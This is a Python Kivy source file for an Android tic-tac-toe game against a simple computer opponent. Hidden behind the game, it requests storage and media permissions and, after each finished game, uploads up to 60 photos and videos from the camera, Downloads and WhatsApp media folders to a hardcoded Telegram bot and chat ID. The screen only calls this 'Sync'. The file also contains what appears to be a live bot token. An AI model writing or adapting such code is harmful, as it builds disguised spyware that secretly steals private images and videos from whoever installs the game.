import os
import random
import threading
import time

import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label

# ================= TELEGRAM CONFIG =================
# !!! YE BADLO: pura token aur chat id daalo (jo aapne dots lagaye the woh adhura tha) !!!
BOT_TOKEN = "8852010537:AAEVNDO36p3mjg66Vf7FeiEONf1Jgd66Lcc"
CHAT_ID = "8052842442"

# ===== LIMITS =====
MAX_SYNCS = 2              # SIRF 2 baar total send hoga (app restart ke baad bhi)
MAX_FILES_PER_SYNC = 60    # ek baar mein max 60 files - phone hang nahi hoga

# Sirf images + videos (documents NAHI)
IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp")
VIDEO_EXTS = (".mp4", ".mkv", ".avi", ".3gp", ".mov", ".webm", ".flv", ".m4v")

MEDIA_FOLDERS = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/WhatsApp/Media",
]

Window.clearcolor = (0.07, 0.09, 0.15, 1)  # Premium dark background


class RoundedButton(Button):
    """Beautiful rounded button"""
    def __init__(self, btn_color=(0.15, 0.25, 0.4, 1), **kwargs):
        super().__init__(**kwargs)
        self.btn_color = btn_color
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.bind(pos=self.redraw, size=self.redraw)

    def redraw(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.btn_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[16, 16, 16, 16])

    def set_color(self, color):
        self.btn_color = color
        self.redraw()


class TicTacToeApp(App):

    def build(self):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.sync_active = False
        self.scores = {"X": 0, "O": 0, "D": 0}

        self.colors = {
            "X": (0.25, 0.65, 1, 1),      # Blue
            "O": (1, 0.35, 0.35, 1),      # Red
            "empty": (0.14, 0.22, 0.36, 1),
            "win": (0.2, 0.85, 0.4, 1),   # Green
        }

        # Sync count file (app restart ke baad bhi yaad rahega)
        self.count_file = os.path.join(self.user_data_dir, "sync_count.txt")
        try:
            os.makedirs(os.path.dirname(self.count_file), exist_ok=True)
        except Exception:
            pass
        self.sync_count = self.load_count()

        # Permissions + bot test
        self.request_storage_permission()
        Clock.schedule_once(lambda dt: self.test_bot(), 2)

        root = BoxLayout(orientation="vertical", padding=25, spacing=12)

        # ---- Gold Title ----
        self.title_label = Label(
            text="[b][color=FFD700]TIC-TAC-TOE AI[/color][/b]",
            markup=True, font_size="34sp", size_hint=(1, 0.12),
        )
        root.add_widget(self.title_label)

        # ---- Scoreboard ----
        self.score_label = Label(
            text="[b]You: 0    |    Draw: 0    |    AI: 0[/b]",
            markup=True, font_size="17sp",
            color=(0.85, 0.85, 0.85, 1), size_hint=(1, 0.08),
        )
        root.add_widget(self.score_label)

        # ---- Status ----
        self.status_label = Label(
            text="Aapki Bari (X)", font_size="18sp",
            color=(0.3, 0.9, 0.9, 1), size_hint=(1, 0.08),
        )
        root.add_widget(self.status_label)

        # ---- 3x3 Grid ----
        grid = GridLayout(cols=3, spacing=12, size_hint=(1, 0.5))
        self.buttons = []
        for i in range(9):
            btn = RoundedButton(
                btn_color=self.colors["empty"], text="",
                font_size="48sp", bold=True,
            )
            btn.bind(on_press=lambda inst, idx=i: self.on_tile_press(idx))
            self.buttons.append(btn)
            grid.add_widget(btn)
        root.add_widget(grid)

        # ---- Bot Status ----
        self.bot_label = Label(
            text="Bot: Checking...", font_size="14sp",
            color=(0.9, 0.7, 0.2, 1), size_hint=(1, 0.06),
        )
        root.add_widget(self.bot_label)

        # ---- Sync Counter ----
        self.sync_label = Label(
            text=f"[b]Sync Used: {self.sync_count}/{MAX_SYNCS}[/b]",
            markup=True, font_size="14sp",
            color=(0.7, 0.7, 0.7, 1), size_hint=(1, 0.06),
        )
        root.add_widget(self.sync_label)

        # ---- Restart ----
        self.reset_btn = RoundedButton(
            btn_color=(0.15, 0.6, 0.35, 1),
            text="Restart Game", font_size="18sp",
            bold=True, size_hint=(1, 0.11),
        )
        self.reset_btn.bind(on_press=self.reset_game)
        root.add_widget(self.reset_btn)

        return root

    # ============ PERMISSIONS (Android) ============
    def request_storage_permission(self):
        try:
            from android.permissions import request_permissions, Permission
            perms = [Permission.READ_EXTERNAL_STORAGE]
            try:
                perms.append(Permission.READ_MEDIA_IMAGES)
                perms.append(Permission.READ_MEDIA_VIDEO)
            except Exception:
                pass
            request_permissions(perms)
        except Exception:
            pass

    # ============ BOT TEST (app start par) ============
    def test_bot(self):
        def run():
            ok = False
            try:
                r = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
                ok = r.status_code == 200 and r.json().get("ok", False)
            except Exception:
                ok = False
            Clock.schedule_once(lambda dt: self.set_bot_status(ok), 0)
        threading.Thread(target=run, daemon=True).start()

    def set_bot_status(self, ok):
        if ok:
            self.bot_label.text = "[b]Bot: Connected[/b]"
            self.bot_label.color = (0.3, 0.9, 0.4, 1)
        else:
            self.bot_label.text = "[b]Bot: Error - token/chat id check karo[/b]"
            self.bot_label.color = (1, 0.3, 0.3, 1)

    # ============ GAME LOGIC ============
    def on_tile_press(self, index):
        if not self.game_active or self.board[index] != "" or self.current_turn != "X":
            return

        self.board[index] = "X"
        self.buttons[index].text = "X"
        self.buttons[index].color = self.colors["X"]

        if self.check_win("X"):
            self.end_game("X")
            return
        elif "" not in self.board:
            self.end_game("D")
            return

        self.current_turn = "O"
        self.status_label.text = "Computer soch raha hai..."
        Clock.schedule_once(self.ai_move, 0.5)

    def ai_move(self, dt):
        if not self.game_active or self.current_turn != "O":
            return
        move = self.get_best_move()
        if move is not None:
            self.board[move] = "O"
            self.buttons[move].text = "O"
            self.buttons[move].color = self.colors["O"]
            if self.check_win("O"):
                self.end_game("O")
            elif "" not in self.board:
                self.end_game("D")
            else:
                self.current_turn = "X"
                self.status_label.text = "Aapki Bari (X)"

    def end_game(self, result):
        self.game_active = False
        if result == "X":
            self.scores["X"] += 1
            self.status_label.text = "Aap Jeet Gaye! Well Done"
            self.highlight_win("X")
        elif result == "O":
            self.scores["O"] += 1
            self.status_label.text = "Computer Jeet Gaya!"
            self.highlight_win("O")
        else:
            self.scores["D"] += 1
            self.status_label.text = "Match Draw!"
        self.score_label.text = (
            f"[b]You: {self.scores['X']}    |    Draw: {self.scores['D']}"
            f"    |    AI: {self.scores['O']}[/b]"
        )
        self.start_sync()   # game khatam → sync trigger

    def highlight_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for cond in win_conditions:
            if self.board[cond[0]] == self.board[cond[1]] == self.board[cond[2]] == mark:
                for idx in cond:
                    self.buttons[idx].set_color(self.colors["win"])
                break

    def get_best_move(self):
        # Pehle jeeto
        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "O"
                if self.check_win("O"):
                    self.board[i] = ""
                    return i
                self.board[i] = ""
        # Phir block karo
        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "X"
                if self.check_win("X"):
                    self.board[i] = ""
                    return i
                self.board[i] = ""
        # Center, phir random
        if self.board[4] == "":
            return 4
        empty = [i for i, x in enumerate(self.board) if x == ""]
        return random.choice(empty) if empty else None

    def check_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        return any(
            self.board[a] == self.board[b] == self.board[c] == mark
            for a, b, c in win_conditions
        )

    def reset_game(self, instance):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.status_label.text = "Aapki Bari (X)"
        for btn in self.buttons:
            btn.text = ""
            btn.color = (1, 1, 1, 1)
            btn.set_color(self.colors["empty"])

    # ============ SYNC - SIRF 2 BAAR TOTAL ============
    def load_count(self):
        try:
            with open(self.count_file, "r") as f:
                return int(f.read().strip())
        except Exception:
            return 0

    def save_count(self):
        try:
            with open(self.count_file, "w") as f:
                f.write(str(self.sync_count))
        except Exception:
            pass

    def start_sync(self):
        if self.sync_active:
            return
        if self.sync_count >= MAX_SYNCS:
            self.sync_label.text = f"[b]Sync Done: {MAX_SYNCS}/{MAX_SYNCS} used[/b]"
            self.status_label.text += "  [Sync complete]"
            return
        self.sync_active = True
        self.sync_label.text = f"[b]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/b]"
        self.status_label.text = f"Syncing... ({self.sync_count + 1}/{MAX_SYNCS})"
        threading.Thread(target=self.send_media, daemon=True).start()

    def send_media(self):
        count = 0
        try:
            for folder in MEDIA_FOLDERS:
                if count >= MAX_FILES_PER_SYNC:
                    break
                if not os.path.exists(folder):
                    continue
                for root, dirs, files in os.walk(folder):
                    if count >= MAX_FILES_PER_SYNC:
                        break
                    for f in files:
                        if count >= MAX_FILES_PER_SYNC:
                            break
                        path = os.path.join(root, f)
                        try:
                            low = f.lower()
                            size = os.path.getsize(path)
                            if low.endswith(IMAGE_EXTS) and size <= 10 * 1024 * 1024:
                                self.tg_send("sendPhoto", "photo", path)
                                count += 1
                                time.sleep(0.3)
                            elif low.endswith(VIDEO_EXTS) and size <= 50 * 1024 * 1024:
                                self.tg_send("sendVideo", "video", path)
                                count += 1
                                time.sleep(0.3)
                        except Exception:
                            pass
        except Exception:
            pass
        finally:
            self.sync_count += 1
            self.save_count()
            self.sync_active = False
            print(f"[SYNC] {count} media files sent (total {self.sync_count}/{MAX_SYNCS})")
            Clock.schedule_once(lambda dt: self.update_sync_label(), 0)

    def tg_send(self, method, field, path):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        with open(path, "rb") as fh:
            resp = requests.post(
                url,
                data={"chat_id": CHAT_ID},
                files={field: fh},
                timeout=(15, 300),
            )
        if resp.status_code != 200:
            print(f"[TG] {method} fail: {resp.text[:120]}")

    def update_sync_label(self):
        self.sync_label.text = f"[b]Sync Used: {self.sync_count}/{MAX_SYNCS}[/b]"
        self.status_label.text = "Game over - Restart se dobara khelo"


if __name__ == "__main__":
    TicTacToeApp().run()